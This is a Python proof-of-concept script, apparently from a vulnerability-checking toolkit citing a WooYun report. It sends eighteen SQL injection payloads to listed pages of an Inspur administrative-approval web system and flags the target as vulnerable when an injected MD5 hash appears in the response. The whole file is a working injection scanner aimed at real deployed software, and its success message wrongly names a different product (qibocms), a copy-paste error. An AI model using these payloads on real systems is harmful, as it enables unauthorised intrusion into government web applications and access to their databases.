#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 浪潮行政审批系统十八处注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0128477
author: Lucifer
description: 多处注入。
'''
import sys
import requests



class inspur_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payloads = ["/Login/Log.aspx?loginname=%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/BusinessView.aspx?infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcWorkProgram.aspx?infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/ColumnList.aspx?LanMuId=%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/OnlineQuery/GetFlowItem.aspx?DeptId=%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcFormList.aspx?listType=&infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&SerailNO=",
                    "/ViewSource/FujianDownLoad.aspx?Id=1/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcNotice.aspx?infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/QAList.aspx?infoflowId=1'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&AspxAutoDetectCookieSupport=1",
                    "/Bulletin/PolicyDownLoad.aspx?ID=1'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/PolicyList.aspx?infoflowId=00003'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&AspxAutoDetectCookieSupport=1",
                    "/login/TransactList.aspx?ItemName=1'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Broadcast/displayNewsPic.aspx?id=00357'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/DocmentDownload.aspx?ID=00247'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/LeaderMail/MailDetail.aspx?QueryId=11'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcPrintList.aspx?SerailNO='/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Business/OfflineDownload.aspx?formId=BBQB'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&filetype=html&infoflowId=00263",
                    "/ViewSource/ProExamineView.aspx?ActivityInstanceId=&ActivitySchemeGuid=9a0b1f9e-d564-4ec9-945f-600b5a4dd2ed'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--"]
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    return "[+]存在qibocms知道系统注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = inspur_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()